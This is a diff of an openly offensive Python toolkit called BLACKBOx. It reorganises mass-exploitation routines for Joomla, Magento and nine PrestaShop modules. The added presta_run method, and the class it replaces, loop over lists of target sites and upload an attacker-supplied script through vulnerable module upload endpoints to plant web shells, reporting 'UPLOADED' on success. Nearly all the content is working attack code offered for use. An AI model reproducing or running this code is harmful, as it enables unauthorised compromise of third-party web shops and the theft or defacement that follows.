@@ -33,7 +33,7 @@ __author__     = 'BLACK EYE'
 __bitbucket__  = 'https://bitbucket.org/darkeye/'
 __emailadd__   = 'blackdoor197@riseup.net'
 __twitter__    = 'https://twitter.com/0x676'
-__version__    = '1.8'
+__version__    = '1.9'
 __license__    = 'GPLv2'
 __scrname__    = 'BLACKBOx v%s' % (__version__)
 
@@ -558,7 +558,7 @@ class BruteForce:
 ##                                ##
 ####################################
 
-class rce:
+class exploit:
 	def joomla(self, wordlist):
 		wordlist = open(wordlist, "r")
 		def get_url(url, user_agent):
@@ -596,7 +596,6 @@ class rce:
 				print i+" : Not Defaced"
 		wordlist.close()
 
-
 	def magento(self, wordlist):
 		wordlist = open(wordlist, "r")
 		for site in wordlist.readlines():
@@ -623,6 +622,183 @@ class rce:
 				print "{0}/admin with login : form:form".format(target_url)
 			else:
 				print "NOT WORKED with {0}".format(target_url)
+	def presta_run(self, lists, script):
+		###
+		### SimpleSlideShow Exploit
+		###
+		def sss_ex(lists, script):
+			print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"SimpleSlideShow Exploit :"+color.ENDC)
+			lists = open(lists,"r")
+			lists = lists.readlines()
+			for url in lists:
+				url=url.strip()
+				url = url + "/modules/simpleslideshow/uploadimage.php"
+				files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
+				req=requests.post(url,files=files)
+				url=url.replace('/uploadimage.php','/slides/'+script)
+				if 'uploadshell' in req.text:
+					print (url+" :"+color.BL+color.BOLD+" UPLOADED")
+				else:
+					print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
+		###
+		### productpageadverts
+		###
+		def ppa_ex(lists, script):
+			print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Productpageadverts Exploit :"+color.ENDC)
+			lists = open(lists,"r")
+			lists = lists.readlines()
+			for url in lists:
+				url=url.strip()
+				url = url + "/modules/productpageadverts/uploadimage.php"
+				files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
+				req=requests.post(url,files=files)
+				url=url.replace('/uploadimage.php','/slides/'+script)
+				if 'uploadshell' in req.text:
+					print (url+" :"+color.BL+color.BOLD+" UPLOADED")
+				else:
+					print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
+		###
+		### HomePageAdvertise
+		###
+		def hpa_ex(lists, script):
+			print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"HomePageAdvertise Exploit :"+color.ENDC)
+			lists = open(lists,"r")
+			lists = lists.readlines()
+			for url in lists:
+				url=url.strip()
+				url = url + "/modules/homepageadvertise/uploadimage.php"
+				files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
+				req=requests.post(url,files=files)
+				url=url.replace('/uploadimage.php','/slides/'+script)
+				if 'uploadshell' in req.text:
+					print (url+" :"+color.BL+color.BOLD+" UPLOADED")
+				else:
+					print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
+		###
+		### ColumnAdvers
+		###
+		def ca_ex(lists, script):
+			print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"ColumnAdvers Exploit :"+color.ENDC)
+			lists = open(lists,"r")
+			lists = lists.readlines()
+			for url in lists:
+				url=url.strip()
+				url = url + "/modules/columnadverts/uploadimage.php"
+				files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
+				req=requests.post(url,files=files)
+				url=url.replace('/uploadimage.php','/slides/'+script)
+				if 'uploadshell' in req.text:
+					print (url+" :"+color.BL+color.BOLD+" UPLOADED")
+				else:
+					print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
+		###
+		### vtemslideshow
+		###
+		def vtss_ex(lists, script):
+			print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Vtemslideshow Exploit :"+color.ENDC)
+			lists = open(lists,"r")
+			lists = lists.readlines()
+			for url in lists:
+				url=url.strip()
+				url = url + "modules/vtemslideshow/uploadimage.php"
+				files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
+				req=requests.post(url,files=files)
+				url=url.replace('/uploadimage.php','/slides/'+script)
+				if 'uploadshell' in req.text:
+					print (url+" :"+color.BL+color.BOLD+" UPLOADED")
+				else:
+					print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
+		###
+		### attributewizardpro
+		###
+		def awp_ex(lists, script):
+			print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Attributewizardpro Exploit :"+color.ENDC)
+			lists = open(lists,"r")
+			lists = lists.readlines()
+			for url in lists:
+				url=url.strip()
+				url = url + "/modules/attributewizardpro/file_upload.php"
+				files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
+				req=requests.post(url,files=files)
+				url=url.replace('/uploadimage.php','/slides/'+script)
+				if 'uploadshell' in req.text:
+					print (url+" :"+color.BL+color.BOLD+" UPLOADED")
+				else:
+					print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
+		###
+		### additionalproductstabs
+		###
+		def aps_ex(lists, script):
+			print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Additionalproductstabs Exploit :"+color.ENDC)
+			lists = open(lists,"r")
+			lists = lists.readlines()
+			for url in lists:
+				url=url.strip()
+				url = url + "/modules/additionalproductstabs/file_upload.php"
+				files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
+				req=requests.post(url,files=files)
+				url=url.replace('/uploadimage.php','/slides/'+script)
+				if 'uploadshell' in req.text:
+					print (url+" :"+color.BL+color.BOLD+" UPLOADED")
+				else:
+					print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
+		###
+		### addthisplugin
+		###
+		def atp_ex(lists, script):
+			print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Addthisplugin Exploit :"+color.ENDC)
+			lists = open(lists,"r")
+			lists = lists.readlines()
+			for url in lists:
+				url=url.strip()
+				url = url + "/modules/addthisplugin/file_upload.php"
+				files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
+				req=requests.post(url,files=files)
+				url=url.replace('/uploadimage.php','/slides/'+script)
+				if 'uploadshell' in req.text:
+					print (url+" :"+color.BL+color.BOLD+" UPLOADED")
+				else:
+					print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
+		###
+		### advancedslider
+		###
+		def as_ex(lists, script):
+			print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Advancedslider Exploit :"+color.ENDC)
+			lists = open(lists,"r")
+			lists = lists.readlines()
+			for url in lists:
+				url=url.strip()
+				url = url + "/modules/advancedslider/file_upload.php"
+				files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
+				req=requests.post(url,files=files)
+				url=url.replace('/uploadimage.php','/slides/'+script)
+				if 'uploadshell' in req.text:
+					print (url+" :"+color.BL+color.BOLD+" UPLOADED")
+				else:
+					print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
+		l = open(lists,"r")
+		l = l.readlines()
+		print (color.M+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(l))+" URL FOUNDED")
+		#Start SimpleSlideShow Exploit
+		sss_ex(lists, script)
+		#Start productpageadverts Exploit
+		ppa_ex(lists, script)
+		#Start HomePageAdvertise Exploit
+		hpa_ex(lists, script)
+		#Start ColumnAdvers Exploit
+		ca_ex(lists, script)
+		#Start vtemslideshow Exploit
+		vtss_ex(lists, script)
+		#Start attributewizardpro Exploit
+		awp_ex(lists, script)
+		#Start additionalproductstabs
+		aps_ex(lists, script)
+		#Start addthisplugin
+		atp_ex(lists, script)
+		#Start advancedslider
+		as_ex(lists, script)
+		#FINISH !
+		print (color.M+color.BOLD+"[+] "+color.BOLD+color.W+"END OF ATTACK")
 
 
 ###
@@ -909,195 +1085,6 @@ class cracker:
 		stop = timeit.default_timer()
 		print (color.BL+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
 
-###
-###EXPLOIT 0DAY
-###
-####################################
-##                                ##
-##      PrestaShop Exploit !      ##
-##                                ##
-####################################
-class presta_exploit:
-	###
-	### SimpleSlideShow Exploit
-	###
-	def sss_ex(self,lists, script):
-		print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"SimpleSlideShow Exploit :"+color.ENDC)
-		lists = open(lists,"r")
-		lists = lists.readlines()
-		for url in lists:
-			url=url.strip()
-			url = url + "/modules/simpleslideshow/uploadimage.php"
-			files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
-			req=requests.post(url,files=files)
-			url=url.replace('/uploadimage.php','/slides/'+script)
-			if 'uploadshell' in req.text:
-				print (url+" :"+color.BL+color.BOLD+" UPLOADED")
-			else:
-				print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
-	###
-	### productpageadverts
-	###
-	def ppa_ex(self,lists, script):
-		print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Productpageadverts Exploit :"+color.ENDC)
-		lists = open(lists,"r")
-		lists = lists.readlines()
-		for url in lists:
-			url=url.strip()
-			url = url + "/modules/productpageadverts/uploadimage.php"
-			files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
-			req=requests.post(url,files=files)
-			url=url.replace('/uploadimage.php','/slides/'+script)
-			if 'uploadshell' in req.text:
-				print (url+" :"+color.BL+color.BOLD+" UPLOADED")
-			else:
-				print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
-	###
-	### HomePageAdvertise
-	###
-	def hpa_ex(self,lists, script):
-		print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"HomePageAdvertise Exploit :"+color.ENDC)
-		lists = open(lists,"r")
-		lists = lists.readlines()
-		for url in lists:
-			url=url.strip()
-			url = url + "/modules/homepageadvertise/uploadimage.php"
-			files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
-			req=requests.post(url,files=files)
-			url=url.replace('/uploadimage.php','/slides/'+script)
-			if 'uploadshell' in req.text:
-				print (url+" :"+color.BL+color.BOLD+" UPLOADED")
-			else:
-				print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
-	###
-	### ColumnAdvers
-	###
-	def ca_ex(self,lists, script):
-		print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"ColumnAdvers Exploit :"+color.ENDC)
-		lists = open(lists,"r")
-		lists = lists.readlines()
-		for url in lists:
-			url=url.strip()
-			url = url + "/modules/columnadverts/uploadimage.php"
-			files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
-			req=requests.post(url,files=files)
-			url=url.replace('/uploadimage.php','/slides/'+script)
-			if 'uploadshell' in req.text:
-				print (url+" :"+color.BL+color.BOLD+" UPLOADED")
-			else:
-				print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
-	###
-	### vtemslideshow
-	###	
-	def vtss_ex(self,lists, script):
-		print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Vtemslideshow Exploit :"+color.ENDC)
-		lists = open(lists,"r")
-		lists = lists.readlines()
-		for url in lists:
-			url=url.strip()
-			url = url + "modules/vtemslideshow/uploadimage.php"
-			files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
-			req=requests.post(url,files=files)
-			url=url.replace('/uploadimage.php','/slides/'+script)
-			if 'uploadshell' in req.text:
-				print (url+" :"+color.BL+color.BOLD+" UPLOADED")
-			else:
-				print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
-	###
-	### attributewizardpro
-	###	
-	def awp_ex(self,lists, script):
-		print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Attributewizardpro Exploit :"+color.ENDC)
-		lists = open(lists,"r")
-		lists = lists.readlines()
-		for url in lists:
-			url=url.strip()
-			url = url + "/modules/attributewizardpro/file_upload.php"
-			files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
-			req=requests.post(url,files=files)
-			url=url.replace('/uploadimage.php','/slides/'+script)
-			if 'uploadshell' in req.text:
-				print (url+" :"+color.BL+color.BOLD+" UPLOADED")
-			else:
-				print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
-	###
-	### additionalproductstabs
-	###	
-	def aps_ex(self,lists, script):
-		print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Additionalproductstabs Exploit :"+color.ENDC)
-		lists = open(lists,"r")
-		lists = lists.readlines()
-		for url in lists:
-			url=url.strip()
-			url = url + "/modules/additionalproductstabs/file_upload.php"
-			files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
-			req=requests.post(url,files=files)
-			url=url.replace('/uploadimage.php','/slides/'+script)
-			if 'uploadshell' in req.text:
-				print (url+" :"+color.BL+color.BOLD+" UPLOADED")
-			else:
-				print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
-	###
-	### addthisplugin
-	###	
-	def atp_ex(self,lists, script):
-		print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Addthisplugin Exploit :"+color.ENDC)
-		lists = open(lists,"r")
-		lists = lists.readlines()
-		for url in lists:
-			url=url.strip()
-			url = url + "/modules/addthisplugin/file_upload.php"
-			files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
-			req=requests.post(url,files=files)
-			url=url.replace('/uploadimage.php','/slides/'+script)
-			if 'uploadshell' in req.text:
-				print (url+" :"+color.BL+color.BOLD+" UPLOADED")
-			else:
-				print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
-	###
-	### advancedslider
-	###	
-	def as_ex(self,lists, script):
-		print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Advancedslider Exploit :"+color.ENDC)
-		lists = open(lists,"r")
-		lists = lists.readlines()
-		for url in lists:
-			url=url.strip()
-			url = url + "/modules/advancedslider/file_upload.php"
-			files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
-			req=requests.post(url,files=files)
-			url=url.replace('/uploadimage.php','/slides/'+script)
-			if 'uploadshell' in req.text:
-				print (url+" :"+color.BL+color.BOLD+" UPLOADED")
-			else:
-				print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
-	###
-	### Start All Exploit
-	###
-	def __init__(self, lists, script):
-		l = open(lists,"r")
-		l = l.readlines()
-		print (color.M+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(l))+" URL FOUNDED")
-		#Start SimpleSlideShow Exploit
-		self.sss_ex(lists,script)
-		#Start productpageadverts Exploit
-		self.ppa_ex(lists,script)
-		#Start HomePageAdvertise Exploit
-		self.hpa_ex(lists,script)
-		#Start ColumnAdvers Exploit
-		self.ca_ex(lists,script)
-		#Start vtemslideshow Exploit
-		self.vtss_ex(lists, script)
-		#Start attributewizardpro Exploit
-		self.awp_ex(lists,script)
-		#Start additionalproductstabs
-		self.aps_ex(lists, script)
-		#Start addthisplugin
-		self.atp_ex(lists, script)
-		#Start advancedslider
-		self.as_ex(lists, script)
-		print (color.M+color.BOLD+"[+] "+color.BOLD+color.W+"END OF ATTACK")
-
 ####################################
 ##                                ##
 ##             MAIN               ##
@@ -1176,7 +1163,7 @@ def __main__():
 			(options,args) = parser.parse_args()
 			wordlist = options.wordlist
 			if wordlist:
-				rce().joomla(wordlist)
+				exploit().joomla(wordlist)
 			errors = []
 			if (wordlist == None):
 				errors.append("[-] No WORDLIST specified.")
@@ -1193,7 +1180,7 @@ def __main__():
 			(options,args) = parser.parse_args()
 			wordlist = options.wordlist
 			if wordlist:
-				rce().magento(wordlist)
+				exploit().magento(wordlist)
 			errors = []
 			if (wordlist == None):
 				errors.append("[-] No WORDLIST specified.")
@@ -1392,7 +1379,7 @@ def __main__():
 			lists = options.lists
 			script = options.script
 			if lists and script:
-				presta_exploit(lists,script)
+				exploit().presta_run(lists,script)
 			errors=[]
 			if (lists == None):
 				errors.append("[-] No LISTS specified.")
